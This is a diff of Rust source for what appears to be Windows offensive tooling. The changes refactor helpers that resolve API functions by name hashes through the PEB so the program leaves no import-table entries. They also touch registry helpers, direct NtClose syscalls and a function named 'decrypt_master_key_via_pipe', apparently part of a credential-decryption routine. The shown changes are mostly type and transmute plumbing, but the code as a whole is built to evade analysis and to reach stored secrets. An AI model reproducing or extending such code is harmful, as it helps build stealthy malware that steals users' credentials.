@@ -54,6 +54,7 @@ type FnSysAllocStringByteLen = unsafe extern "system" fn(*const i8, u32) -> *mut
 type FnSysFreeString = unsafe extern "system" fn(*mut u16);
 type FnLocalFree = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
 type FnLoadLibraryA = unsafe extern "system" fn(*const i8) -> HMODULE;
+type FnLoadLibraryW = unsafe extern "system" fn(*const u16) -> HMODULE;
 type FnFreeLibrary = unsafe extern "system" fn(HMODULE) -> i32;
 type FnGetProcAddress = unsafe extern "system" fn(HMODULE, *const i8) -> *mut c_void;
 type FnWaitNamedPipeW = unsafe extern "system" fn(*const u16, DWORD) -> i32;
@@ -67,12 +68,22 @@ type FnReadFile = unsafe extern "system" fn(
     HANDLE, *mut c_void, DWORD, *mut DWORD, *mut c_void,
 ) -> i32;
 
+#[inline(always)]
+unsafe fn fn_ptr_from_addr<T: Copy>(addr: usize) -> T {
+    debug_assert_eq!(
+        std::mem::size_of::<T>(),
+        std::mem::size_of::<usize>(),
+        "function pointer size mismatch"
+    );
+    std::mem::transmute_copy::<usize, T>(&addr)
+}
+
 /// Resolve a function pointer by DLL hash and function-name hash.
 #[inline(always)]
-unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
+unsafe fn resolve_api<T: Copy>(dll_hash: u32, fn_hash: u32) -> Option<T> {
     let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
     let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
-    Some(std::mem::transmute::<_, T>(fn_addr))
+    Some(fn_ptr_from_addr::<T>(fn_addr))
 }
 
 /// Resolve a function from a DLL that may not be in the PEB yet.
@@ -83,11 +94,14 @@ unsafe fn resolve_api_or_load<T>(
     dll_wide: &[u16],
     dll_hash: u32,
     fn_hash: u32,
-) -> Option<T> {
+) -> Option<T>
+where
+    T: Copy,
+{
     // Try PEB first.
     if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
         if let Some(addr) = pe_resolve::get_proc_address_by_hash(base, fn_hash) {
-            return Some(std::mem::transmute::<_, T>(addr));
+            return Some(fn_ptr_from_addr::<T>(addr));
         }
     }
     // DLL not loaded yet — use LoadLibraryW from kernel32.
@@ -102,7 +116,7 @@ unsafe fn resolve_api_or_load<T>(
     let _hmod = load_library_w(dll_wide.as_ptr());
     let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
     let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
-    Some(std::mem::transmute::<_, T>(fn_addr))
+    Some(fn_ptr_from_addr::<T>(fn_addr))
 }
 // ── Registry helpers via pe_resolve (no IAT entries) ───────────────────────
 //
@@ -113,7 +127,7 @@ unsafe fn resolve_api_or_load<T>(
 // PEB (no static import).
 
 type FnRegOpenKeyExW = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *mut *mut c_void) -> i32;
-type FnRegQueryValueExW = unsafe extern "system" fn(*mut c_void, *const u16, *mut u32, *mut u8, *mut u8, *mut u32) -> i32;
+type FnRegQueryValueExW = unsafe extern "system" fn(*mut c_void, *const u16, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
 type FnRegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
 
 /// Resolve advapi32.dll base by hashing its name at runtime.
@@ -182,9 +196,9 @@ unsafe fn reg_close_key(hkey: *mut c_void) {
 
 /// Resolve a typed function pointer from a known DLL base and function-name hash.
 #[inline(always)]
-unsafe fn resolve_api_from_base<T>(dll_base: usize, fn_hash: u32) -> Option<T> {
+unsafe fn resolve_api_from_base<T: Copy>(dll_base: usize, fn_hash: u32) -> Option<T> {
     let addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
-    Some(std::mem::transmute::<_, T>(addr))
+    Some(fn_ptr_from_addr::<T>(addr))
 }
 
 // ── Public result types ────────────────────────────────────────────────────────
@@ -981,7 +995,7 @@ fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
     impl Drop for PipeGuard {
         fn drop(&mut self) {
             if !self.0.is_null() {
-                let _ = syscall!("NtClose", self.0 as u64);
+                let _ = crate::syscall!("NtClose", self.0 as u64);
             }
         }
     }
